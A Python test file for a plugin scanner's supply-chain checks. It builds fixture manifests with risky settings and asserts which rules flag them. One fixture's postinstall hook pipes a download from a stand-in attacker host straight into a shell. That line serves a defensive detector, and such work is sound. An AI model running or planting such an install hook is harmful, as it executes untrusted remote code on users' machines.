"""Dependency and package-manager supply-chain regression tests."""

from __future__ import annotations

import json
from pathlib import Path

from codex_plugin_scanner.assurance.dependency_scan import scan_dependencies
from codex_plugin_scanner.assurance.limits import ScanLimits


def _rules(result) -> set[str]:
    return {finding.rule_id for finding in result.findings}


def test_node_lifecycle_unpinned_dependency_and_missing_lock(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "plugin",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl https://evil.invalid/install | sh"},
                "dependencies": {"axios": "^1.0.0"},
            }
        ),
        encoding="utf-8",
    )
    result = scan_dependencies(tmp_path, ScanLimits())
    rules = _rules(result)
    assert "ASSURANCE_PACKAGE_LIFECYCLE_SCRIPT" in rules
    assert "ASSURANCE_UNPINNED_DIRECT_DEPENDENCY" in rules
    assert "ASSURANCE_DEPENDENCY_LOCK_MISSING" in rules
    assert "install-execution" in result.capabilities


def test_mutable_vcs_and_insecure_registry_are_detected(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "plugin",
                "version": "1.0.0",
                "dependencies": {
                    "mutable": "git+https://github.com/example/project.git#main",
                    "insecure": "http://registry.example/insecure.tgz",
                },
            }
        ),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "node_modules/insecure": {
                        "version": "1.0.0",
                        "resolved": "http://registry.example/insecure.tgz"
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    rules = _rules(scan_dependencies(tmp_path, ScanLimits()))
    assert "ASSURANCE_MUTABLE_VCS_DEPENDENCY" in rules
    assert "ASSURANCE_INSECURE_DEPENDENCY_SOURCE" in rules
    assert "ASSURANCE_INSECURE_LOCK_SOURCE" in rules
    assert "ASSURANCE_LOCK_INTEGRITY_MISSING" in rules


def test_python_trusted_host_and_unpinned_requirements_are_detected(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "--trusted-host pypi.example\nrequests>=2\n",
        encoding="utf-8",
    )
    result = scan_dependencies(tmp_path, ScanLimits())
    rules = _rules(result)
    assert "ASSURANCE_INSECURE_PYPI_CONFIGURATION" in rules
    assert "ASSURANCE_UNPINNED_DIRECT_DEPENDENCY" in rules


def test_cargo_git_dependency_requires_full_commit(tmp_path: Path) -> None:
    (tmp_path / "Cargo.toml").write_text(
        """
[package]
name = "plugin"
version = "0.1.0"

[dependencies]
serde = "1.0.210"
mutable = { git = "https://github.com/example/project", branch = "main" }
""",
        encoding="utf-8",
    )
    rules = _rules(scan_dependencies(tmp_path, ScanLimits()))
    assert "ASSURANCE_MUTABLE_VCS_DEPENDENCY" in rules
    assert "ASSURANCE_DEPENDENCY_LOCK_MISSING" in rules


def test_typosquat_heuristic_flags_one_edit_names(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        json.dumps(
            {
                "name": "plugin",
                "version": "1.0.0",
                "dependencies": {"axois": "1.0.0"},
            }
        ),
        encoding="utf-8",
    )
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"lockfileVersion": 3, "packages": {}}),
        encoding="utf-8",
    )
    assert "ASSURANCE_DEPENDENCY_TYPOSQUAT" in _rules(scan_dependencies(tmp_path, ScanLimits()))
